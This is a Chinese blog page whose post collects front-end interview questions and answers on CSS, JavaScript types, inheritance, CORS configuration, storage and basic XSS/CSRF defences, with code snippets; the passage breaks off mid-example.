<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="theme-color" content="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/logo.png?v=5.1.4"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png?v=5.1.4"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png?v=5.1.4"><link rel="mask-icon" href="/logo.png?v=5.1.4" color="#222"><meta name="keywords" content="Google SEO, 互联网营销, 工业品营销, 矿山机械"><link rel="alternate" href="/atom.xml" title="Ray's Blog" type="application/atom+xml"><meta name="description" content="Google SEO|互联网营销|工业品营销|矿山机械电子商务|B2B、SEM、社交、EDM邮件营销、市场营销"><meta property="og:type" content="website"><meta property="og:title" content="Ray&#39;s Blog"><meta property="og:url" content="http://www.love4026.org/index.html"><meta property="og:site_name" content="Ray&#39;s Blog"><meta property="og:description" content="Google SEO|互联网营销|工业品营销|矿山机械电子商务|B2B、SEM、社交、EDM邮件营销、市场营销"><meta property="og:locale" content="zh-Hans"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Ray&#39;s Blog"><meta name="twitter:description" content="Google SEO|互联网营销|工业品营销|矿山机械电子商务|B2B、SEM、社交、EDM邮件营销、市场营销"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Pisces",version:"5.1.4",sidebar:{position:"left",display:"post",offset:12,b2t:!1,scrollpercent:!1,onmobile:!1},fancybox:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},duoshuo:{userId:"0",author:"博主"},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><link rel="canonical" href="http://www.love4026.org/"><title>Google SEO|互联网营销|工业品营销|矿山机械电子商务|B2B、SEM、社交、EDM邮件营销、市场营销 - Ray's Blog</title></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-home"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">Ray's Blog</span><span class="logo-line-after"><i></i></span></a></div><h1 class="site-subtitle" itemprop="description">Google SEO|互联网营销|工业矿山机械</h1></div><div class="site-nav-toggle"> <button><span class="btn-bar"></span><span class="btn-bar"></span><span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br> 首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br> 关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br> 标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br> 分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br> 归档</a></li><li class="menu-item menu-item-友情链接"><a href="/links/" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i><br> 友情链接</a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><section id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/316020/2018-front-end-interview-questions/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/316020/2018-front-end-interview-questions/" itemprop="url">2018前端面试题收集</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-06T19:41:27+08:00">2018-03-06</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">5,899</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="CSS-有哪些样式可以给子元素继承"><a href="#CSS-有哪些样式可以给子元素继承" class="headerlink" title="CSS 有哪些样式可以给子元素继承!"></a>CSS 有哪些样式可以给子元素继承!</h2><p>可继承的:<code>font-size</code>,<code>font-weight</code>,<code>line-height</code>,<code>color</code>,<code>cursor</code>等<br>不可继承的一般是会改变盒子模型的:<code>display</code>,<code>margin</code>、<code>border</code>、<code>padding</code>、<code>height</code>等</p><h2 id="box-sizing常用的属性有哪些-分别有啥作用"><a href="#box-sizing常用的属性有哪些-分别有啥作用" class="headerlink" title="box-sizing常用的属性有哪些? 分别有啥作用?"></a>box-sizing常用的属性有哪些? 分别有啥作用?</h2><p>box-sizing有两个值:content-box(W3C标准盒模型),border-box(怪异模型),<br>这个css 主要是改变盒子模型大小的计算形式<br>可能有人会问padding-box,这个之前只有 Firefox 标准实现了,目前50+的版本已经废除;<br>用一个栗子来距离,一个div的宽高分别100px,border为5px,padding为5px</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.test</span> &#123;</span></span><br><span class="line"><span class="undefined">      box-sizing: content-box;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">border</span>: 5<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#f00</span>;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">padding</span><span class="selector-pseudo">:5px</span>;</span></span><br><span class="line"><span class="undefined">      width: 100px;</span></span><br><span class="line"><span class="undefined">      height: 100px;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">content-box的计算公式会把宽高的定义指向 content,border和 padding 另外计算,</span></span><br><span class="line"><span class="comment">也就是说 content + padding + border = 120px(盒子实际大小)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">而border-box的计算公式是总的大小涵盖这三者, content 会缩小,来让给另外两者</span></span><br><span class="line"><span class="comment">content(80px) + padding(5*2px) + border(5*2px) = 100px</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="清除浮动的方式有哪些-比较好的是哪一种"><a href="#清除浮动的方式有哪些-比较好的是哪一种" class="headerlink" title="清除浮动的方式有哪些?比较好的是哪一种?"></a>清除浮动的方式有哪些?比较好的是哪一种?</h2><p>常用的一般为三种<code>.clearfix</code>, <code>clear:both</code>,<code>overflow:hidden</code>;</p><h2 id="CSS-中transition和animate有何区别-animate-如何停留在最后一帧"><a href="#CSS-中transition和animate有何区别-animate-如何停留在最后一帧" class="headerlink" title="CSS 中transition和animate有何区别? animate 如何停留在最后一帧!"></a>CSS 中transition和animate有何区别? animate 如何停留在最后一帧!</h2><p>这种问题见仁见智,我的回答大体是这样的..待我捋捋.<br>transition一般用来做过渡的,而animate则是做动效,算是前者的一个补充拓展;<br>过渡的开销比动效小,前者一般用于交互居多,后者用于活动页居多;<br>至于如何让animate停留在最后一帧也好办,就它自身参数的一个值就可以了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">animation-fill-mode: forwards;  </span><br><span class="line"><span class="comment">&lt;!--backwards则停留在首帧,both是轮流--&gt;</span></span><br></pre></td></tr></table></figure><p>让我们来举个栗子….自己新建一个 html 跑一下….</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Box-sizing<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.test</span> &#123;</span></span><br><span class="line"><span class="undefined">      box-sizing: border-box;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">border</span>: 5<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#f00</span>;</span></span><br><span class="line"><span class="undefined">      padding: 5px;</span></span><br><span class="line"><span class="undefined">      width: 100px;</span></span><br><span class="line"><span class="undefined">      height: 100px;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>;</span></span><br><span class="line"><span class="undefined">      /*</span></span><br><span class="line"><span class="undefined">      简写的姿势排序</span></span><br><span class="line"><span class="css">      @<span class="keyword">keyframes</span> name : 动画名</span></span><br><span class="line"><span class="undefined">      duration 持续时间</span></span><br><span class="line"><span class="undefined">      timing-function 动画频率</span></span><br><span class="line"><span class="undefined">      delay 延迟多久开始</span></span><br><span class="line"><span class="undefined">      iteration-count 循环次数</span></span><br><span class="line"><span class="undefined">      direction 动画方式,往返还是正向</span></span><br><span class="line"><span class="undefined">      fill-mode  一般用来处理停留在某一帧</span></span><br><span class="line"><span class="undefined">      play-state running 开始,paused 暂停 ....</span></span><br><span class="line"><span class="undefined">       更多的参数去查文档吧..我就不一一列举了</span></span><br><span class="line"><span class="undefined">      */</span></span><br><span class="line"><span class="css">      <span class="selector-tag">animation</span>: <span class="selector-tag">moveChangeColor</span>  <span class="selector-tag">ease-in</span> 2<span class="selector-class">.5s</span> 1  <span class="selector-tag">forwards</span> <span class="selector-tag">running</span>;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">    @<span class="keyword">keyframes</span> moveChangeColor &#123;</span></span><br><span class="line"><span class="undefined">       from &#123;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">top</span><span class="selector-pseudo">:0</span>%;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">left</span><span class="selector-pseudo">:5</span>%;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">background-color</span>:<span class="selector-id">#f00</span></span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">       to&#123;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">top</span><span class="selector-pseudo">:0</span>%;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">left</span><span class="selector-pseudo">:50</span>%;</span></span><br><span class="line"><span class="css">         <span class="selector-tag">background-color</span>:<span class="selector-id">#ced</span>;</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="块级元素水平垂直居中的方法"><a href="#块级元素水平垂直居中的方法" class="headerlink" title="块级元素水平垂直居中的方法"></a>块级元素水平垂直居中的方法</h2><p>我们要考虑两种情况,定宽高和不定宽高的;</p><p>方案 N 多种,我记得我很早写过这类的笔记</p><p><a href="http://blog.csdn.net/column/details/center-layout.html" target="_blank" rel="noopener">网页元素居中攻略记</a></p><h2 id="CSS样式权重的优先级"><a href="#CSS样式权重的优先级" class="headerlink" title="CSS样式权重的优先级"></a>CSS样式权重的优先级</h2><pre><code>!important &gt; 行内样式 &gt; id &gt; class &gt; tag
</code></pre><p>CSS特异性</p><h2 id="JS有几种数据类型-其中哪些的基本数据类型有哪些"><a href="#JS有几种数据类型-其中哪些的基本数据类型有哪些" class="headerlink" title="JS有几种数据类型,其中哪些的基本数据类型有哪些!"></a>JS有几种数据类型,其中哪些的基本数据类型有哪些!</h2><p>七种数据类型</p><ul><li>Boolean</li><li>Null</li><li>Undefined</li><li>Number</li><li>String</li><li>Symbol (ECMAScript 6 新定义)</li><li>Object</li></ul><p>其中5种为基本类型: <code>string</code>,<code>number</code>,<code>boolean</code>,<code>null</code>,<code>undefined</code></p><p><code>Object</code> 为引用类型(范围挺大),也包括数组、函数,</p><p><code>Symbol</code>是原始数据类型 ，表示独一无二的值</p><h2 id="null和undefined的差异"><a href="#null和undefined的差异" class="headerlink" title="null和undefined的差异"></a><code>null</code>和<code>undefined</code>的差异</h2><p><strong>相同点</strong></p><p>在 if判断语句中,值都默认为 false<br>大体上两者都是代表无,具体看差异</p><p><strong>不同点</strong></p><ul><li>null转为数字类型值为0,而undefined转为数字类型为 NaN(Not a Number)</li><li>undefined是代表调用一个值而该值却没有赋值,这时候默认则为undefined</li><li>null是一个很特殊的对象,最为常见的一个用法就是作为参数传入(说明该参数不是对象)</li><li>设置为null的变量或者对象会被内存收集器回收</li></ul><h2 id="this对象的理解"><a href="#this对象的理解" class="headerlink" title="this对象的理解"></a>this对象的理解</h2><p>简言之: 谁调用指向谁, 运行时的上下文确定, 而非定义的时候就确定;</p><p>强行绑定 this的话,可以用 call,apply,bind,箭头函数….来修改this的指向</p><h2 id="bind的-js简单模拟"><a href="#bind的-js简单模拟" class="headerlink" title="bind的 js简单模拟"></a>bind的 js简单模拟</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.emulateBind =  <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> self.apply(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="怎么解决跨域问题-有哪些方法"><a href="#怎么解决跨域问题-有哪些方法" class="headerlink" title="怎么解决跨域问题,有哪些方法"></a>怎么解决跨域问题,有哪些方法</h2><p>我一般用这三种, cors, nginx反向代理, jsonp</p><ul><li><p>jsonp : 单纯的 get 一些数据,局限性很大…就是利用script标签的src属性来实现跨域。</p></li><li><p>nginx 反向代理: 主要就是用了nginx.conf内的proxy_pass <a href="http://xxx.xxx.xxx" target="_blank" rel="noopener">http://xxx.xxx.xxx</a>, 会把所有请求代理到那个域名,有利也有弊吧..</p></li><li><p>cors的话,可控性较强,需要前后端都设置,兼容性 IE10+ ,比如</p><pre><code>Access-Control-Allow-Origin: http://foo.example  // 子域乃至整个域名或所有域名是否允许访问
Access-Control-Allow-Methods: POST, GET, OPTIONS // 允许那些行为方法
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type  // 允许的头部字段
Access-Control-Max-Age: 86400  // 有效期
</code></pre></li></ul><p>若是我们要用 nginx或者 express 配置cors应该怎么搞起? 来个简易版本的</p><p>nginx</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">   # 检查域名后缀</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Allow-Origin xx.xx.com;</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Allow-Methods GET,POST,OPTIONS;</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Allow-Credentials <span class="literal">true</span>;</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Allow-Headers DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-<span class="keyword">With</span>,<span class="keyword">If</span>-Modified-Since,Cache-Control,Content-<span class="keyword">Type</span>;</span><br><span class="line">    add_header <span class="keyword">Access</span>-Control-Max-Age <span class="number">86400</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>express, 当然这货也有一些别人封装好的 cors中间件,操作性更强…</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">let express = require('express');  </span><br><span class="line">let app = express();  </span><br><span class="line"></span><br><span class="line">//设置所有请求的头部</span><br><span class="line">app.all('*', (req, res, next) =&gt;  &#123;  </span><br><span class="line">    res.header(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"xx.xx.com"</span>);  </span><br><span class="line">    res.header(<span class="string">"Access-Control-Allow-Headers"</span>, <span class="string">"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type"</span>);  </span><br><span class="line">    res.header(<span class="string">"Access-Control-Allow-Methods"</span>,<span class="string">"<span class="keyword">PUT</span>,<span class="keyword">POST</span>,<span class="keyword">GET</span>,<span class="keyword">DELETE</span>,<span class="keyword">OPTIONS</span>"</span>);  </span><br><span class="line">    next();  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>有些还会跟你死磕,,除了这些还有其他姿势么…我说了一个HTML5的postMessage….</p><p>这货用于iframe 传递消息居多, 大体有这么两步步</p><ul><li>window打开一个实例,传递一个消息到一个x域名</li><li>x 域名下监听message事件,获取传递的消息</li></ul><p>这货的兼容性没那么好,而且没考虑周全的下容易遭受 CSRF 攻击</p><h2 id="对于XSS-和-CSRF-如何防范"><a href="#对于XSS-和-CSRF-如何防范" class="headerlink" title="对于XSS 和 CSRF 如何防范"></a>对于XSS 和 CSRF 如何防范</h2><p>这里就不说概念性的东西了</p><p><strong>XSS的防范</strong></p><ul><li>我能想到的就是转义&lt;&gt;这些造成代码直接运行的的标签..轮询或者正则替换<br> 而面试官说这种的效率最低下,我回来仔细找了找相关资料好像没有更优方案…有的留言…</li></ul><ul><li>若是有用到 cookie,设置为http-only,避免客户端的篡改</li></ul><p><strong>CSRF的防范一般这几种</strong></p><ul><li>验证码,用户体验虽然不好,,但是很多场合下可以防范大多数攻击</li><li>验证 HTTP Referer 字段,判断请求来源</li><li>token加密解密,这种是目前很常用的手段了…</li></ul><p>任何防范都有代价的,比如验证码造成的体验不好,token滥用造成的性能问题,轮询替换造成的响应时间等</p><h2 id="描述下cookie-sessionStorage-localSotrage的差异"><a href="#描述下cookie-sessionStorage-localSotrage的差异" class="headerlink" title="描述下cookie,sessionStorage,localSotrage的差异"></a>描述下cookie,sessionStorage,localSotrage的差异</h2><ul><li>cookie : 大小4KB 左右,跟随请求(请求头),会占用带宽资源,但是若是用来判断用户是否在线这些挺方便</li><li>sessionStorage和localStorage大同小异,大小看浏览器支持,一般为5MB,数据只保留在本地,不参与服务端交互.<ul><li>sessionStorage的生存周期只限于会话中,关闭了储存的数据就没了.</li><li>localStorage则保留在本地,没有人为清除会一直保留</li></ul></li></ul><h2 id="javascript里面的继承怎么实现，如何避免原型链上面的对象共享"><a href="#javascript里面的继承怎么实现，如何避免原型链上面的对象共享" class="headerlink" title="javascript里面的继承怎么实现，如何避免原型链上面的对象共享"></a>javascript里面的继承怎么实现，如何避免原型链上面的对象共享</h2><p>我在写的时候,用了两种,一个是 ES5和 ES6的方案</p><p>ES5:寄生组合式继承:通过借用构造函数来继承属性和原型链来实现子继承父。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ParentClass</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    ParentClass.prototype.sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"I'm parent!"</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//若是要多个参数可以用apply 结合 ...解构</span></span><br><span class="line">      ParentClass.call(<span class="keyword">this</span>, name);</span><br><span class="line">      <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    SubClass.prototype = <span class="built_in">Object</span>.create(ParentClass.prototype);</span><br><span class="line">    SubClass.prototype.constructor = SubClass;</span><br><span class="line">    SubClass.prototype.sayChildHello = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"I'm child "</span> + <span class="keyword">this</span>.name)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> testA = <span class="keyword">new</span> SubClass(<span class="string">'CRPER'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Object.create()的polyfill</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    function pureObject(o)&#123;</span></span><br><span class="line"><span class="comment">        //定义了一个临时构造函数</span></span><br><span class="line"><span class="comment">         function F() &#123;&#125;</span></span><br><span class="line"><span class="comment">         //将这个临时构造函数的原型指向了传入进来的对象。</span></span><br><span class="line"><span class="comment">         F.prototype = obj;</span></span><br><span class="line"><span class="comment">         //返回这个构造函数的一个实例。该实例拥有obj的所有属性和方法。</span></span><br><span class="line"><span class="comment">         //因为该实例的原型是obj对象。</span></span><br><span class="line"><span class="comment">         return new F();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure><p>ES6: 其实就是ES5的语法糖,不过可读性很强..</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">      constructor(name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">      &#125;</span><br><span class="line">      sayHello() &#123;</span><br><span class="line">        console.log(<span class="string">"I'm parent!"</span> + <span class="keyword">this</span>.name);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">      constructor(name) &#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">      &#125;</span><br><span class="line">      sayChildHello() &#123;</span><br><span class="line">        console.log(<span class="string">"I'm child "</span> + <span class="keyword">this</span>.name)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 重新声明父类同名方法会覆写,ES5的话就是直接操作自己的原型链上</span></span><br><span class="line">      sayHello()&#123;</span><br><span class="line">        console.log(<span class="string">"override parent method !,I'm sayHello Method"</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let testA = <span class="keyword">new</span> <span class="type">SubClass</span>(<span class="symbol">'CRPE</span>R')</span><br></pre></td></tr></table></figure><p>到这里就结束了么…不,这只是笔试,</p><p>问的时候你用过静态方法,静态属性,私有变量么?</p><p>这个静态方法是ES6之后才有这么个玩意,有这么些特点</p><ul><li>方法不能给 this引用,可以给类直接引用</li><li>静态不可以给实例调用,比如 let a = new ParentClass =&gt; a.sayHello() 会抛出异常</li><li>父类静态方法,子类非static方法没法覆盖父类</li><li>静态方法可以给子类继承</li><li>静态属性可以继承也可以被修改</li></ul><p>看下面的代码..</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 